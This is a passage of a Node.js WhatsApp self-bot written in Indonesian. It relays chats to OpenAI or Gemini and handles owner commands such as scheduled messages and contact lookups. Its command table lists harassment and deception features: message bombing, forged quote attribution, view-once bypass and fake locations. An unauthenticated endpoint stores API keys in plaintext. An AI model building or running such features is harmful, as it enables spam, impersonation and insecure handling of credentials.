            for (const file of files) fs.unlinkSync(path.join(dirPath, file));
            await sock.sendMessage(from, { text: `Sistem telah menghapus ${files.length} berkas sementara.` });
        } else {
            await sock.sendMessage(from, { text: `Direktori media kosong atau tidak ditemukan.` });
        }
        break;
    }

    case 'jadwalpesan': {
        const partsJadwal = konfirmasiState.args.split(' ');
        const waktuTarget = partsJadwal[0]; 
        const teksJadwal = partsJadwal.slice(1).join(' ');
        
        if (!waktuTarget.includes(':')) return sock.sendMessage(from, { text: "Gagal: gunakan format jam:menit (contoh: 14:30)." });
        const [jam, menit] = waktuTarget.split(':');
        
        await sock.sendMessage(from, { text: `Jadwal ditambahkan pada pukul ${jam}:${menit}.` });
        
        const cronInterval = setInterval(async () => {
            if (!global.aktifFitur.includes('jadwalpesan')) return clearInterval(cronInterval);
            const now = new Date();
            if (now.getHours() === parseInt(jam) && now.getMinutes() === parseInt(menit)) {
                await sock.sendMessage(from, { text: `${teksJadwal}` });
                clearInterval(cronInterval);
            }
        }, 60000); 
        break;
    }

    case 'pengingatpribadi': {
        const partsIngat = konfirmasiState.args.split(' ');
        const waktuIngat = partsIngat[0];
        const teksIngat = partsIngat.slice(1).join(' ');
        
        await sock.sendMessage(from, { text: `Pengingat pribadi diaktifkan.` });
        const targetSelf = sock.user.id.split(':')[0] + '@s.whatsapp.net'; 
        
        const [hour, minute] = waktuIngat.split(':');
        const checkReminder = setInterval(async () => {
            if (!global.aktifFitur.includes('pengingatpribadi')) return clearInterval(checkReminder);
            const now = new Date();
            if (now.getHours() === parseInt(hour) && now.getMinutes() === parseInt(minute)) {
                await sock.sendMessage(targetSelf, { text: `Pengingat sistem: ${teksIngat}` });
                clearInterval(checkReminder);
            }
        }, 60000);
        break;
    }

    case 'cekinformasikontak': {
        let nomorCek = konfirmasiState.args.replace(/[^0-9]/g, '');
        if (!nomorCek) return sock.sendMessage(from, { text: "Gagal: masukkan target nomor." });
        let jidCek = nomorCek + '@s.whatsapp.net';
        
        try {
            const [result] = await sock.onWhatsApp(jidCek);
            if (result && result.exists) {
                let ppUrl = 'Tidak ada profil';
                try { ppUrl = await sock.profilePictureUrl(jidCek, 'image'); } catch(e){}
                
                let about = 'Tidak ada bio';
                try { const statusData = await sock.fetchStatus(jidCek); about = statusData.status || about; } catch(e){}
                
                await sock.sendMessage(from, { text: `Hasil pemindaian kontak:\n\nID: ${result.jid}\nStatus WA: ${about}\nTautan profil: ${ppUrl}` });
            } else {
                await sock.sendMessage(from, { text: `Nomor tidak terdaftar.` });
            }
        } catch (err) {
            await sock.sendMessage(from, { text: `Gagal memproses permintaan.` });
        }
        break;
    }

    case 'cekversibaileys':
        const { version, isLatest } = await require('@whiskeysockets/baileys').fetchLatestBaileysVersion();
        await sock.sendMessage(from, { text: `Versi modul: ${version.join('.')}\nPembaruan tersedia: ${isLatest ? 'Tidak' : 'Ya'}\nKoneksi stabil.` });
        break;

    case 'restartbot':
        await sock.sendMessage(from, { text: `Sistem memulai ulang.` });
        setTimeout(() => { process.exit(1); }, 2000); 
        break;

    case 'matikanbot':
        await sock.sendMessage(from, { text: `Sistem dimatikan.` });
        setTimeout(() => { process.exit(0); }, 2000); 
        break;

    case 'gantinamabot':
        if (!konfirmasiState.args) return sock.sendMessage(from, { text: "Gagal: nama tidak disertakan." });
        await sock.updateProfileName(konfirmasiState.args);
        await sock.sendMessage(from, { text: `Nama profil berhasil diubah menjadi: ${konfirmasiState.args}` });
        break;

    case 'gantibiografi':
        if (!konfirmasiState.args) return sock.sendMessage(from, { text: "Gagal: biografi tidak disertakan." });
        await sock.updateProfileStatus(konfirmasiState.args);
        await sock.sendMessage(from, { text: `Status profil berhasil diperbarui.` });
        break;

    case 'gantifotoprofil': {
        if (!msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
            return sock.sendMessage(from, { text: `Gagal: anda harus mengutip gambar.` });
        }
        await sock.sendMessage(from, { text: `Memproses foto profil.` });
        const ppTargetImage = msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage;
        const ppBuffer = await downloadMediaBaileys(ppTargetImage, 'image');
        await sock.updateProfilePicture(sock.user.id, ppBuffer);
        await sock.sendMessage(from, { text: `Pembaruan foto profil berhasil.` });
        break;
    }

    case 'modeeksklusif':
        global.isExclusiveMode = true; 
        await sock.sendMessage(from, { text: `Mode pembatasan akses aktif.` });
        break;

    case 'arsipkalsemua':
        await sock.sendMessage(from, { text: `Memindahkan seluruh interaksi ke arsip.` });
        const allChatsArchive = Object.keys(userHistory);
        for (const chatArchive of allChatsArchive) {
             try { await sock.chatModify({ archive: true, lastMessages: [{ messageTimestamp: Date.now() }] }, chatArchive); } catch(e){}
        }
        await sock.sendMessage(from, { text: `Proses pengarsipan selesai.` });
        break;

    case 'bacakalsemua':
        await sock.sendMessage(from, { text: `Menandai seluruh pesan telah dibaca.` });
        const allChatsRead = Object.keys(userHistory);
        for (const chatRead of allChatsRead) {
            try { await sock.readMessages([{ remoteJid: chatRead, id: "SIMULASI_ID_READ" }]); } catch(e){}
        }
        await sock.sendMessage(from, { text: `Proses penandaan pesan selesai.` });
        break;

    case 'kuncisistem':
        if (!konfirmasiState.args) return sock.sendMessage(from, { text: "Gagal: kata sandi tidak disertakan." });
        global.systemPasswordLock = konfirmasiState.args.trim();
        global.isSystemLocked = true; 
        await sock.sendMessage(from, { text: `Sistem terkunci dan membutuhkan kata sandi untuk diakses kembali.` });
        break;

}

                delete global.pendingKonfirmasi[from];
                return await sock.sendMessage(from, { text: `Status: Disetujui\nWaktu: ${waktuWIB}\nDetail: Fitur ${konfirmasiState.nama} diaktifkan.` });
            } 
            else if (inputBalasan === 'N') {
                delete global.pendingKonfirmasi[from];
                return await sock.sendMessage(from, { text: `Status: Dibatalkan\nWaktu: ${waktuWIB}\nDetail: Otorisasi ditolak.` });
            }
            return; 
        }

        const sistemFiturDB = {
            '!vgen': { tipe: 'menu' },
            '.sticker': { tipe: 'generate', butuhArgs: false },
            '.brat': { tipe: 'generate', butuhArgs: true, format: '.brat [teks]' },
            '.bekukanterakhirdilihat': { tipe: 'privasi', nama: 'bekukanterakhirdilihat', butuhArgs: false, detail: 'Membekukan aktivitas terakhir.' },
            '.sembunyikanstatusonline': { tipe: 'privasi', nama: 'sembunyikanstatusonline', butuhArgs: false, detail: 'Menghilangkan status online.' },
            '.selalumengetik': { tipe: 'privasi', nama: 'selalumengetik', butuhArgs: false, detail: 'Membuat indikator mengetik selalu muncul.' },
            '.selalumerekam': { tipe: 'privasi', nama: 'selalumerekam', butuhArgs: false, detail: 'Membuat indikator merekam selalu muncul.' },
            '.matikanmengetik': { tipe: 'privasi', nama: 'matikanmengetik', butuhArgs: false, detail: 'Menyembunyikan status mengetik.' },
            '.matikanmerekam': { tipe: 'privasi', nama: 'matikanmerekam', butuhArgs: false, detail: 'Menyembunyikan status merekam.' },
            '.antihapuspesan': { tipe: 'privasi', nama: 'antihapuspesan', butuhArgs: false, detail: 'Mencegah penghapusan pesan di ruang obrolan.' },
            '.antihapusstatus': { tipe: 'privasi', nama: 'antihapusstatus', butuhArgs: false, detail: 'Mencegah status pembaruan dihapus.' },
            '.centangbirupelajar': { tipe: 'privasi', nama: 'centangbirupelajar', butuhArgs: false, detail: 'Menunda laporan dibaca.' },
            '.matikanread': { tipe: 'privasi', nama: 'matikanread', butuhArgs: false, detail: 'Mematikan fitur baca sepenuhnya.' },
            '.tandaiwaktubaca': { tipe: 'privasi', nama: 'tandaiwaktubaca', butuhArgs: true, format: '.tandaiwaktubaca [menit]', detail: 'Memberikan jeda baca otomatis.' },
            '.antiviewonce': { tipe: 'keamanan', nama: 'antiviewonce', butuhArgs: false, detail: 'Mengakses media sekali lihat.' },
            '.blokirasing': { tipe: 'keamanan', nama: 'blokirasing', butuhArgs: false, detail: 'Memblokir kontak baru secara otomatis.' },
            '.blokirluarnegeri': { tipe: 'keamanan', nama: 'blokirluarnegeri', butuhArgs: false, detail: 'Memblokir wilayah luar negeri.' },
            '.tolakpanggilan': { tipe: 'keamanan', nama: 'tolakpanggilan', butuhArgs: false, detail: 'Menolak semua panggilan.' },
            '.antipromosi': { tipe: 'keamanan', nama: 'antipromosi', butuhArgs: false, detail: 'Menghapus tautan secara otomatis.' },
            '.diteruskanberkalikali': { tipe: 'manipulasi', nama: 'diteruskanberkalikali', butuhArgs: false, detail: 'Simulasi pesan dengan skor penerusan.' },
            '.tanpatagditeruskan': { tipe: 'manipulasi', nama: 'tanpatagditeruskan', butuhArgs: false, detail: 'Menghapus atribusi pesan.' },
            '.pesanpalsu': { tipe: 'manipulasi', nama: 'pesanpalsu', butuhArgs: true, format: '.pesanpalsu [target] [teks]', detail: 'Memalsukan atribusi kutipan.' },
            '.pesanverifikasi': { tipe: 'manipulasi', nama: 'pesanverifikasi', butuhArgs: false, detail: 'Menampilkan lencana verifikasi.' },
            '.pesanrahasia': { tipe: 'manipulasi', nama: 'pesanrahasia', butuhArgs: true, format: '.pesanrahasia [pancingan] | [teks]', detail: 'Membuat pesan tertutup.' },
            '.pesanephemeral': { tipe: 'manipulasi', nama: 'pesanephemeral', butuhArgs: false, detail: 'Mengatur durasi pesan.' },
            '.hancurkanpesan': { tipe: 'manipulasi', nama: 'hancurkanpesan', butuhArgs: false, detail: 'Mengubah media biasa menjadi durasi terbatas.' },
            '.tolaklink': { tipe: 'filter', nama: 'tolaklink', butuhArgs: false, detail: 'Menyaring tautan.' },
            '.tolakmedia': { tipe: 'filter', nama: 'tolakmedia', butuhArgs: false, detail: 'Menolak data media visual.' },
            '.tolakdokumen': { tipe: 'filter', nama: 'tolakdokumen', butuhArgs: false, detail: 'Menolak berkas non-media.' },
            '.tolaklokasi': { tipe: 'filter', nama: 'tolaklokasi', butuhArgs: false, detail: 'Menolak pin lokasi spasial.' },
            '.tolakkontak': { tipe: 'filter', nama: 'tolakkontak', butuhArgs: false, detail: 'Menolak berkas data buku alamat.' },
            '.autoreadstatus': { tipe: 'auto', nama: 'autoreadstatus', butuhArgs: false, detail: 'Membaca pembaruan secara diam-diam.' },
            '.autodownloadstatus': { tipe: 'auto', nama: 'autodownloadstatus', butuhArgs: false, detail: 'Menyimpan metadata otomatis.' },
            '.arsipotomatis': { tipe: 'auto', nama: 'arsipotomatis', butuhArgs: false, detail: 'Memindahkan notifikasi ke arsip.' },
            '.pinchatotomatis': { tipe: 'auto', nama: 'pinchatotomatis', butuhArgs: true, format: '.pinchatotomatis [nomor]', detail: 'Menempatkan kontak di prioritas atas.' },
            '.bisukanotomatis': { tipe: 'auto', nama: 'bisukanotomatis', butuhArgs: true, format: '.bisukanotomatis [nomor] [menit]', detail: 'Menghilangkan notifikasi kontak target.' },
            '.bersihkanchat': { tipe: 'auto', nama: 'bersihkanchat', butuhArgs: false, detail: 'Mengahapus interaksi.' },
            '.tandaitelahdibaca': { tipe: 'auto', nama: 'tandaitelahdibaca', butuhArgs: false, detail: 'Menghentikan penanda tidak dibaca.' },
            '.bomteks': { tipe: 'spam', nama: 'bomteks', butuhArgs: true, format: '.bomteks [jumlah] [teks]', detail: 'Melakukan transmisi tinggi pesan teks.' },
            '.bomkosong': { tipe: 'spam', nama: 'bomkosong', butuhArgs: true, format: '.bomkosong [jumlah]', detail: 'Melakukan transmisi kosong karakter.' },
            '.spamreaksi': { tipe: 'spam', nama: 'spamreaksi', butuhArgs: true, format: '.spamreaksi [simbol]', detail: 'Mengulang siklus respons singkat.' },
            '.reaksiotomatis': { tipe: 'spam', nama: 'reaksiotomatis', butuhArgs: true, format: '.reaksiotomatis [simbol]', detail: 'Menjadikan balasan respons seragam.' },
            '.ubahsuara': { tipe: 'media', nama: 'ubahsuara', butuhArgs: true, format: '.ubahsuara [tipe]', detail: 'Melakukan distorsi atau modifikasi data audio.' },
            '.dokumenpalsu': { tipe: 'media', nama: 'dokumenpalsu', butuhArgs: true, format: '.dokumenpalsu [MB]', detail: 'Memanipulasi berkas kosong berukuran besar.' },
            '.kontakpalsu': { tipe: 'media', nama: 'kontakpalsu', butuhArgs: true, format: '.kontakpalsu [nama] [nomor]', detail: 'Menyusun berkas kontak artifisial.' },
            '.lokasipalsu': { tipe: 'media', nama: 'lokasipalsu', butuhArgs: true, format: '.lokasipalsu [lat] [long]', detail: 'Menggeser koordinat geografis di sistem.' },
            '.simpanmediaotomatis': { tipe: 'media', nama: 'simpanmediaotomatis', butuhArgs: false, detail: 'Membuka penyimpanan otomatis.' },
            '.hapusmediaotomatis': { tipe: 'media', nama: 'hapusmediaotomatis', butuhArgs: false, detail: 'Mengelola penyimpanan media di latar belakang.' },
            '.jadwalpesan': { tipe: 'sistem', nama: 'jadwalpesan', butuhArgs: true, format: '.jadwalpesan [jam:menit] [teks]', detail: 'Membangun rutinitas pesan waktu spesifik.' },
            '.pengingatpribadi': { tipe: 'sistem', nama: 'pengingatpribadi', butuhArgs: true, format: '.pengingatpribadi [jam:menit] [teks]', detail: 'Membangun notifikasi terjadwal mandiri.' },
            '.cekinformasikontak': { tipe: 'sistem', nama: 'cekinformasikontak', butuhArgs: true, format: '.cekinformasikontak [nomor]', detail: 'Melakukan query basis data pengguna.' },
            '.cekversibaileys': { tipe: 'sistem', nama: 'cekversibaileys', butuhArgs: false, detail: 'Melakukan verifikasi sistem server.' },
            '.restartbot': { tipe: 'sistem', nama: 'restartbot', butuhArgs: false, detail: 'Menutup sementara memori latar belakang.' },
            '.matikanbot': { tipe: 'sistem', nama: 'matikanbot', butuhArgs: false, detail: 'Menutup secara penuh sistem ini.' },
            '.gantinamabot': { tipe: 'sistem', nama: 'gantinamabot', butuhArgs: true, format: '.gantinamabot [nama]', detail: 'Menulis ulang basis nama akun server ini.' },
            '.gantibiografi': { tipe: 'sistem', nama: 'gantibiografi', butuhArgs: true, format: '.gantibiografi [teks]', detail: 'Mengganti detail informasi publik tentang server.' },
            '.gantifotoprofil': { tipe: 'sistem', nama: 'gantifotoprofil', butuhArgs: false, detail: 'Mengganti data visual profil server akun.' },
            '.modeeksklusif': { tipe: 'sistem', nama: 'modeeksklusif', butuhArgs: false, detail: 'Membatasi interaksi menjadi lingkungan pribadi.' },
            '.arsipkalsemua': { tipe: 'sistem', nama: 'arsipkalsemua', butuhArgs: false, detail: 'Memindahkan keseluruhan interaksi keluar pandangan.' },
            '.bacakalsemua': { tipe: 'sistem', nama: 'bacakalsemua', butuhArgs: false, detail: 'Membersihkan keseluruhan tanda unread interaksi.' },
            '.kuncisistem': { tipe: 'sistem', nama: 'kuncisistem', butuhArgs: true, format: '.kuncisistem [pass]', detail: 'Menghadang akses masuk fungsional server ini.' }
        };

        if (sistemFiturDB[cmdName] && msg.key.fromMe) {
            const f = sistemFiturDB[cmdName];
            
            if (f.tipe === 'menu') {
                const textMenu = `Daftar perintah asisten virtual:
- .sticker
- .brat [teks]
- .bekukanterakhirdilihat
- .sembunyikanstatusonline
- .selalumengetik
- .selalumerekam
- .matikanmengetik
- .matikanmerekam
- .antihapuspesan
- .antihapusstatus
- .centangbirupelajar
- .matikanread
- .tandaiwaktubaca [menit]
- .antiviewonce
- .blokirasing
- .blokirluarnegeri
- .tolakpanggilan
- .antipromosi
- .diteruskanberkalikali
- .tanpatagditeruskan
- .pesanpalsu [target] [teks]
- .pesanverifikasi
- .pesanrahasia [pancingan] | [teks]
- .pesanephemeral
- .hancurkanpesan
- .tolaklink
- .tolakmedia
- .tolakdokumen
- .tolaklokasi
- .tolakkontak
- .autoreadstatus
- .autodownloadstatus
- .arsipotomatis
- .pinchatotomatis [nomor]
- .bisukanotomatis [nomor] [menit]
- .bersihkanchat
- .tandaitelahdibaca
- .bomteks [jumlah] [teks]
- .bomkosong [jumlah]
- .spamreaksi [simbol]
- .reaksiotomatis [simbol]
- .ubahsuara [tipe]
- .dokumenpalsu [MB]
- .kontakpalsu [nama] [nomor]
- .lokasipalsu [lat] [long]
- .simpanmediaotomatis
- .hapusmediaotomatis
- .jadwalpesan [jam:menit] [teks]
- .pengingatpribadi [jam:menit] [teks]
- .cekinformasikontak [nomor]
- .cekversibaileys
- .restartbot
- .matikanbot
- .gantinamabot [nama]
- .gantibiografi [teks]
- .gantifotoprofil
- .modeeksklusif
- .arsipkalsemua
- .bacakalsemua
- .kuncisistem [pass]`;
                return sock.sendMessage(from, { text: textMenu });
            }

            if (f.butuhArgs && !argsTeks && f.tipe !== 'menu' && !hasMedia) {
                return sock.sendMessage(from, { text: `Ditolak: argumen tidak valid.\nGunakan: ${f.format}` });
            }

            if (f.tipe === 'generate') {
                return sock.sendMessage(from, { text: `Perintah ${cmdName} diproses.` });
            } else {
                const waktuWIB = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
                global.pendingKonfirmasi[from] = { nama: f.nama, args: argsTeks };
                
                const daftarAktif = global.aktifFitur.length > 0 ? global.aktifFitur.join(', ') : 'Tidak ada';
                
                const konfirmasiMsg = `Konfirmasi otorisasi sistem.
Waktu: ${waktuWIB}
Target: ${f.nama}
Detail: ${f.detail}
Fitur aktif: ${daftarAktif}

Ketik Y untuk melanjutkan.
Ketik N untuk membatalkan.`;
                return sock.sendMessage(from, { text: konfirmasiMsg });
            }
        }

        let finalPrompt = pesanTeks.trim();
        let base64Media = null; 
        let mimeTypeMedia = null;

        const quotedMsg = msg.message?.extendedTextMessage?.contextInfo;
        let quotedMediaMsg = null;
        
        if (quotedMsg) {
            const quotedKeys = Object.keys(quotedMsg.quotedMessage || {});
            const hasQuotedMedia = quotedKeys.some(k => ['imageMessage', 'videoMessage', 'documentMessage', 'stickerMessage'].includes(k));
            
            if (hasQuotedMedia) quotedMediaMsg = quotedMsg.quotedMessage; 
            const quotedText = quotedMsg.quotedMessage?.conversation || quotedMsg.quotedMessage?.extendedTextMessage?.text;
            if (quotedText) finalPrompt = `[Konteks balasan: "${quotedText}"]\n\nRespon untuk: ${finalPrompt}`;
        }

        if ((hasMedia || quotedMediaMsg) && finalPrompt === "") {
            finalPrompt = "[Sistem: Pengguna mengirimkan media lampiran]";
        }
        
        if (isAudio && finalPrompt === "") {
            finalPrompt = "[Sistem: Pengguna mengirimkan pesan suara, namun sistem tidak memproses format audio]";
        }

           if (finalPrompt !== "" || hasMedia || quotedMediaMsg) {
            if (!activeApiKey) return reply("Kunci otorisasi belum diatur.");
            
            await sock.sendPresenceUpdate('composing', from);
            
            try {
                let aiResponse = "";
                let targetMsg = hasMedia ? realMsg[type] : (quotedMediaMsg ? quotedMediaMsg[Object.keys(quotedMediaMsg)[0]] : null);
                
                if (targetMsg && (type === 'imageMessage' || quotedMediaMsg?.imageMessage || type === 'stickerMessage' || quotedMediaMsg?.stickerMessage || type === 'documentMessage')) {
                    let mediaType = 'document';
                    if (type === 'imageMessage' || quotedMediaMsg?.imageMessage) mediaType = 'image';
                    if (type === 'stickerMessage' || quotedMediaMsg?.stickerMessage) mediaType = 'sticker';

                    const buffer = await downloadMediaBaileys(targetMsg, mediaType);
                    
                    if (buffer) {
                        base64Media = buffer.toString('base64');
                        if (mediaType === 'sticker') mimeTypeMedia = 'image/webp';
                        else if (mediaType === 'document') mimeTypeMedia = 'application/pdf';
                        else mimeTypeMedia = 'image/jpeg';
                        finalPrompt = `[Lampiran File] Analisa berkas ini: ${finalPrompt}`;


                        const path = require('path');
                        const folderRiwayat = path.join(__dirname, 'riwayat_media');
                        if (!fs.existsSync(folderRiwayat)) fs.mkdirSync(folderRiwayat, { recursive: true });

                        let ekstensi = '.bin';
                        if (mediaType === 'image') ekstensi = '.jpg';
                        if (mediaType === 'sticker') ekstensi = '.webp';
                        if (mediaType === 'document') ekstensi = '.pdf'; 

                        const namaFile = `Media_${pengirimRaw}_${Date.now()}${ekstensi}`;
                        fs.writeFileSync(path.join(folderRiwayat, namaFile), buffer);
                    }
                }

                 if (activeProvider === 'OPENAI') {
                    let finalUserContent = finalPrompt;
                    if (base64Media) {
                        finalUserContent = [
                            { type: "text", text: finalPrompt },
                            { type: "image_url", image_url: { url: `data:${mimeTypeMedia || 'image/jpeg'};base64,${base64Media}` } }
                        ];
                    }

                    const openAiMessages = [
                        { role: "system", content: vgenPrompt },
                        ...userHistory[from].map(h => ({ role: h.role, content: h.content })),
                        { role: "user", content: finalUserContent }
                    ];
                    const targetEndpoint = db.apiConfig?.baseUrl || 'https://api.openai.com/v1/chat/completions';
                    const res = await fetch(targetEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${activeApiKey}` },
                        body: JSON.stringify({ model: activeModel, messages: openAiMessages })
                    });
                    const data = await res.json();
                    
                    if (data.error) throw new Error(data.error.message || JSON.stringify(data.error));
                    if (data.choices && data.choices.length > 0) aiResponse = data.choices[0].message.content;
                }
                else if (activeProvider === 'GEMINI') {
                    let geminiContents = userHistory[from].map(h => ({
                        role: h.role === 'assistant' ? 'model' : 'user',
                        parts: [{ text: h.content }]
                    }));
                    
                    let currentParts = [{ text: finalPrompt }];
                    if (base64Media) currentParts.push({ inline_data: { mime_type: mimeTypeMedia || "image/jpeg", data: base64Media } });
                    geminiContents.push({ role: "user", parts: currentParts });

                    const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${activeModel}:generateContent?key=${activeApiKey}`, {
                        method: 'POST', 
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ system_instruction: { parts: [{ text: vgenPrompt }] }, contents: geminiContents })
                    });
                    const data = await res.json();
                    if (data.error) throw new Error(data.error.message);
                    if (data.candidates) aiResponse = data.candidates[0].content.parts[0].text;
                }

                if (aiResponse) {
                    const finalOutput = aiResponse.trim();
                    await reply(finalOutput);

                    console.log(`Balasan asisten: ${aiResponse.replace(/\n/g, ' ').substring(0, 50)}...`);

                    if (!userHistory[from]) userHistory[from] = [];
                    userHistory[from].push({ role: 'user', content: finalPrompt });
                    userHistory[from].push({ role: 'assistant', content: aiResponse });
                    if (userHistory[from].length > MAX_HISTORY) userHistory[from] = userHistory[from].slice(-MAX_HISTORY);
                }
              } catch (error) {
                const realError = error.message.replace(/\n/g, ' ');
                console.log(`Terjadi galat pada sistem: ${realError.substring(0,80)}`);             
                await reply(`Peringatan sistem: kendala memproses respons.\nKeterangan: ${realError}`);
            } finally {
                await sock.sendPresenceUpdate('paused', from);
            }
        }
    });
} 

app.post('/deploy-key', (req, res) => {
    const { apiKey, provider, model } = req.body;
    if (!apiKey || !model) return res.status(400).json({ error: "API Key tidak boleh kosong." });
    
    activeApiKey = apiKey;
    activeProvider = provider ? provider.toUpperCase() : "OPENAI"; 
    activeModel = model;

    db.apiConfig = { apiKey: activeApiKey, provider: activeProvider, model: activeModel };
    saveDb();

    const deployTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    console.log(`Sistem terhubung.\nWaktu: ${deployTime}\nPenyedia: ${activeProvider}\nModel: ${activeModel}`);

    res.json({ success: true, message: `Otorisasi diterima untuk model: ${activeModel}` });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Layanan lokal berjalan di port ${PORT}.`);
});

startBot();
